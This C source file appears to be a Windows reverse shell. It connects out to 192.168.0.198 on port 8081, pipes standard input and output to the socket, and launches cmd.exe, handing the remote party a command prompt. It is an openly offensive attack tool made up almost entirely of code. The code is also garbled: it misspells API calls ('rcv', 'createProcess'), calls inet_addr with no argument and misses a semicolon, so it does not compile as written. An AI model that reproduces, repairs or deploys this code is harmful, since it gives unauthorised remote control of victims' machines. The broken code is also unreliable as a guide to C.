#include <stdio.h>
#include <stdbool.h>
#include <stdbool.h>

#pragma comment(lib, "Ws2_32.lib");

#ifdef _WIN32
#include <ws2tcpip.h>
#include <Winsock2.h>
#include <windows.h>
#include <processthreadsapi.h>
#endif

/**
 * @brief basically here we are creating a client for windows
 * 
 */

void main()
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;

    // process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    char buffer[512];

    int connection;

    char ip_addr[] = "192.168.0.198";

    WSAStartup(MAKEWORD(2, 2), &wsa);

    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,  NULL , (unsigned int) NULL, (unsigned int) NULL); // create a TCP socket

    shell_addr.sin_port = htons(8081);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr();

    connection = WSAConnect(shell, (SOCKADDR*) shell_addr, sizeof(shell_addr), NULL, NULL, NULL); // connect to the target server

    if(connection == SOCKET_ERROR)
    {
        printf("[!] COnnection to the target server failed, \n");
        exit(0);
    }
    else
    {
        rcv(shell, &buffer, sizeof(buffer), 0);
        memset(&si, 0, sizeof(si));

        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW)
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // Pipe std input/output/err to the socket

        createProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL, &si, &pi); // Spawn command promt

        WaitForSingleObject(pi.hProcess, INFINITE);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        memset(buffer, 0, sizeof(buffer));
    }
}